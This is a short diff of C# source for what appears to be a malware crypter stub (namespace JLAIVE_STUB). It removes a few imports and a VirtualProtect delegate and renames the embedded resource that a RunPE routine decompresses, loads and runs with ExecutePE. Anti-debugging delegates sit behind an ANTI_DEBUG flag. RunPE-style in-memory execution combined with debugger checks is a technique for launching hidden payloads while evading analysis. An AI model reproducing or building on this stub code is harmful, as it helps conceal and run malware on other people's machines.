@@ -2,14 +2,10 @@
 using System.Diagnostics;
 using System.IO;
 using System.IO.Compression;
-using System.Text;
 using System.Reflection;
 using System.Runtime.InteropServices;
-using System.Security.Cryptography;
-using System.Security.Principal;
 using System.Management;
 using System.Threading;
-using Microsoft.Win32;
 
 namespace JLAIVE_STUB
 {
@@ -92,7 +88,7 @@ namespace JLAIVE_STUB
             string[] targs = args.Length > 0 ? args[0].Split(' ') : new string[0];
 
 #if USE_RUNPE
-            byte[] runpebytes = Uncompress(GetEmbeddedResource(runpestr));
+            byte[] runpebytes = Uncompress(GetEmbeddedResource("JLAIVE_RP"));
             Assembly runpe = Assembly.Load(runpebytes);
             runpe.GetType("runpe.RunPE").GetMethod("ExecutePE").Invoke(null, new object[]
             {
@@ -149,7 +145,6 @@ namespace JLAIVE_STUB
         [DllImport("kernel32.dll")]
         static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 
-        delegate bool VirtualProtectD(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 #if ANTI_DEBUG
         delegate bool CheckRemoteDebuggerPresentD(IntPtr hProcess, ref bool isDebuggerPresent);
         delegate bool IsDebuggerPresentD();
